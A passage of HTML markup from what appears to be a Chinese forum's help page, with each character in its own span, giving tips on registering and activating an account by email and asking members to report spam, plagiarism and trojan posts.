style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">速</span><span style="display: inline-block; text-indent: initial;">准</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">参</span><span style="display: inline-block; text-indent: initial;">看</span><span style="display: inline-block; text-indent: initial;">地</span><span style="display: inline-block; text-indent: initial;">址</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">需</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">认</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">箱</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">否</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">选</span><span style="display: inline-block; text-indent: initial;">择</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">使</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">页</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">E</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">l</span><span style="display: inline-block; text-indent: initial;">栏</span><span style="display: inline-block; text-indent: initial;">输</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">想</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">果</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">使</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">提</span><span style="display: inline-block; text-indent: initial;">示</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">预</span><span style="display: inline-block; text-indent: initial;">祝</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">独</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">二</span><span style="display: inline-block; text-indent: initial;">！</span></span></p></li><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">查</span><span style="display: inline-block; text-indent: initial;">看</span><span style="display: inline-block; text-indent: initial;">系</span><span style="display: inline-block; text-indent: initial;">统</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">否</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">包</span><span style="display: inline-block; text-indent: initial;">括</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">分</span><span style="display: inline-block; text-indent: initial;">钟</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">果</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">造</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">输</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">空</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">浏</span><span style="display: inline-block; text-indent: initial;">览</span><span style="display: inline-block; text-indent: initial;">器</span><span style="display: inline-block; text-indent: initial;">缓</span><span style="display: inline-block; text-indent: initial;">存</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">k</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">三</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">做</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">最</span><span style="display: inline-block; text-indent: initial;">重</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">第</span><span style="display: inline-block; text-indent: initial;">四</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">箱</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><strong style="line-height: 1.6;"><span style="color: rgb(0, 0, 255); line-height: 1.6;"><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">需</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">域</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">箱</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">白</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">单</span><span style="display: inline-block; text-indent: initial;">中</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">便</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">准</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">误</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">收</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">送</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">只</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">才</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">常</span><span style="display: inline-block; text-indent: initial;">访</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">回</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">载</span><span style="display: inline-block; text-indent: initial;">附</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">否</span><span style="display: inline-block; text-indent: initial;">则</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">掉</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">何</span><span style="display: inline-block; text-indent: initial;">操</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">具</span><span style="display: inline-block; text-indent: initial;">体</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">看</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">子</span></span></strong><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li></ol><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">奖</span></h2><p style="margin-bottom: 0px; color: rgb(53, 53, 53);"><span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">热</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">员</span><span style="display: inline-block; text-indent: initial;">积</span><span style="display: inline-block; text-indent: initial;">极</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">行</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">协</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">工</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">斑</span><span style="display: inline-block; text-indent: initial;">竹</span><span style="display: inline-block; text-indent: initial;">巡</span><span style="display: inline-block; text-indent: initial;">查</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">辛</span><span style="display: inline-block; text-indent: initial;">勤</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">益</span><span style="display: inline-block; text-indent: initial;">恢</span><span style="display: inline-block; text-indent: initial;">复</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">常</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">但</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">灌</span><span style="display: inline-block; text-indent: initial;">水</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">冒</span><span style="display: inline-block; text-indent: initial;">充</span><span style="display: inline-block; text-indent: initial;">别</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">品</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">甚</span><span style="display: inline-block; text-indent: initial;">至</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">木</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">层</span><span style="display: inline-block; text-indent: initial;">出</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">穷</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">虽</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">反</span><span style="display: inline-block; text-indent: initial;">病</span><span style="display: inline-block; text-indent: initial;">毒</span><span style="display: inline-block; text-indent: initial;">工</span><span style="display: inline-block; text-indent: initial;">程</span><span style="display: inline-block; text-indent: initial;">师</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">但</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">力</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">远</span><span style="display: inline-block; text-indent: initial;">远</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">够</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">里</span><span style="display: inline-block; text-indent: initial;">需</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">家</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: initial;">参</span><span style="display: inline-block; text-indent: initial;">与</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">维</span><span style="display: inline-block; text-indent: initial;">护</span><span style="display: inline-block; text-indent: initial;">中</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">维</span><span style="display: inline-block; text-indent: initial;">护</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">责</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">尽</span><span style="display: inline-block; text-indent: initial;">自</span><span style="display: inline-block; text-indent: initial;">己</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">份</span><span style="display: inline-block; text-indent: initial;">力</span><span style="display: inline-block; text-indent: initial;">量</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">维</span><span style="display: inline-block; text-indent: initial;">护</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">秩</span><span style="display: inline-block; text-indent: initial;">序</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">帖</span><span style="display: inline-block; text-indent: initial;">子</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">诉</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">投</span><span style="display: inline-block; text-indent: initial;">诉</span><span style="display: inline-block; text-indent: initial;">举</span><span style="display: inline-block; text-indent: initial;">报</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">f</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">u</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">站</span><span style="display: inline-block; text-indent: initial;">点</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">文</span><span style="display: inline-block; text-indent: initial;">档</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><strong><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">般</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">这</span><span style="display: inline-block; text-indent: initial;">里</span><span style="display: inline-block; text-indent: initial;">都</span><span style="display: inline-block; text-indent: 